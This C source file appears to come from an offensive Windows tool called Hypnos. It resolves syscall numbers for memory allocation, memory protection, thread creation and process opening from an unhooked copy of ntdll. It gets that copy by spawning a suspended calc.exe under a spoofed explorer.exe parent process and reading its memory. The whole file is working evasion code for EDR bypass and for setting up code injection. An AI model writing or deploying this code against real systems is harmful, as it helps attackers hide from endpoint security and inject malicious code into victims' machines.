#include <malloc.h>
#include "includes/sysgate.h"
#include "includes/Native.h"

// Function prototypes
void Hypnos_GetImageExportDirectory(LPVOID imageBase, PIMAGE_EXPORT_DIRECTORY* ppNtdllExportDirectory);
void* Hypnos_GetProcAddress(PVOID imageBase, LPCSTR toFind);
WORD Hypnos_GetSyscallNumber(void* addr);
DWORD FindProcess(const char* name);
HANDLE SpoofProcessPPID(LPCSTR toSpawn, LPCSTR parentName);
void* getNtdllCopy();

// External function prototypes
extern void PrepareSyscall(DWORD syscallNum);
extern NTSTATUS InvokeSyscall();

PSYSCALL_TABLE InitSyscalls() {
    PSYSCALL_TABLE table = (PSYSCALL_TABLE)malloc(sizeof(SYSCALL_TABLE));
    LPVOID ntdllCopy = getNtdllCopy();
    
    table->NtAllocateVirtualMemory.name = "NtAllocateVirtualMemory";
    table->NtAllocateVirtualMemory.num = Hypnos_GetSyscallNumber(
            Hypnos_GetProcAddress(ntdllCopy, "NtAllocateVirtualMemory"));
    
    table->NtProtectVirtualMemory.name = "NtProtectVirtualMemory";
    table->NtProtectVirtualMemory.num = Hypnos_GetSyscallNumber(
            Hypnos_GetProcAddress(ntdllCopy, "NtProtectVirtualMemory"));
    
    table->NtCreateThreadEx.name = "NtCreateThreadEx";
    table->NtCreateThreadEx.num = Hypnos_GetSyscallNumber(Hypnos_GetProcAddress(ntdllCopy, "NtCreateThreadEx"));
    
    table->ZwOpenProcess.name = "ZwOpenProcess";
    table->ZwOpenProcess.num = Hypnos_GetSyscallNumber(Hypnos_GetProcAddress(ntdllCopy, "ZwOpenProcess"));

    return table;
}

void Hypnos_GetImageExportDirectory(LPVOID imageBase, PIMAGE_EXPORT_DIRECTORY* ppNtdllExportDirectory) {
    // Getting DOS header
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
    // Getting NT headers
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)imageBase + dosHeader->e_lfanew);

    *ppNtdllExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)imageBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
}

void* Hypnos_GetProcAddress(PVOID imageBase, LPCSTR toFind) {
	PIMAGE_EXPORT_DIRECTORY pNtdllExportDirectory;
    Hypnos_GetImageExportDirectory(imageBase, &pNtdllExportDirectory);

	PDWORD pdwFunctionNames = (PDWORD)((PBYTE)imageBase + pNtdllExportDirectory->AddressOfNames);
	PDWORD pdwFunctionAddresses = (PDWORD)((PBYTE)imageBase + pNtdllExportDirectory->AddressOfFunctions);
	PWORD pwAddressOfNameOrdinals = (PWORD)((PBYTE)imageBase + pNtdllExportDirectory->AddressOfNameOrdinals);

	// Walking over exported functions 
	for (int i = 0; i < pNtdllExportDirectory->NumberOfNames; i++) {
		// Grabbing function name and function address
		char* pFunctionName = (char*)((PBYTE)imageBase + pdwFunctionNames[i]);
		void* pFunctionAddress = (PBYTE)imageBase + pdwFunctionAddresses[pwAddressOfNameOrdinals[i]]; 

		if (strcmp(pFunctionName, toFind) == 0) return pFunctionAddress;
	}

	return NULL;
}

WORD Hypnos_GetSyscallNumber(void* addr) {
	return (WORD)*((PBYTE)addr + 4);
}

void* getNtdllCopy() {
    // Gets a HANDLE to NTDLL via suspended process method
    HANDLE childHandle = SpoofProcessPPID("calc.exe", "explorer.exe");
    if (childHandle == INVALID_HANDLE_VALUE) {
        printf("[!] Could not create child process\n");
        return NULL;
    }

    // Parsing headers from NTDLL
    HMODULE moduleNtdll = GetModuleHandleA("ntdll");
    PIMAGE_DOS_HEADER ntdllDosHeader =(PIMAGE_DOS_HEADER)moduleNtdll;
    PIMAGE_NT_HEADERS  ntdllNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)ntdllDosHeader + (BYTE)ntdllDosHeader->e_lfanew);
    DWORD ntdllSize = ntdllNtHeaders->OptionalHeader.SizeOfImage;

    LPVOID ntdllCopy = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ntdllSize);
    if (!ReadProcessMemory(childHandle, moduleNtdll, ntdllCopy, ntdllSize, NULL)) {
        printf("[!] Could not read process memory to ntdllCopy, %d\n", GetLastError());
        return NULL;
    }

    WaitForSingleObjectEx(GetCurrentProcess(), 2000, TRUE);
    TerminateProcess(childHandle, 0);

    return ntdllCopy;
}

HANDLE SpoofProcessPPID(LPCSTR toSpawn, LPCSTR parentName) {
    DWORD parentPid = FindProcess(parentName);
    STARTUPINFOEXA startUpInfo;
    PROCESS_INFORMATION processInformation;
    SIZE_T attributeSize;
    SecureZeroMemory(&startUpInfo, sizeof(startUpInfo));
    SecureZeroMemory(&processInformation, sizeof(processInformation));

    HANDLE parentHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, parentPid);

    // Setting up attributes to spoof PPID
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    startUpInfo.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST) HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(startUpInfo.lpAttributeList, 1, 0, &attributeSize);
    UpdateProcThreadAttribute(startUpInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentHandle, sizeof(HANDLE), NULL, NULL);
    startUpInfo.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    // Now, we can create the child process
    BOOL res = CreateProcessA(NULL, (LPSTR)toSpawn, NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
                              NULL, NULL, &startUpInfo.StartupInfo, &processInformation);

    if (res) {
        printf("[+] Spoofed PPID of %s to %s at %lu\n", toSpawn, parentName, parentPid);
    }

    return processInformation.hProcess;
}

DWORD FindProcess(LPCSTR name) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return -1;

    PROCESSENTRY32 processentry32;
    processentry32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &processentry32)) return -1;

    do {
        if (strcmp(processentry32.szExeFile, name) == 0) {
            return processentry32.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &processentry32));

    return -1;
}
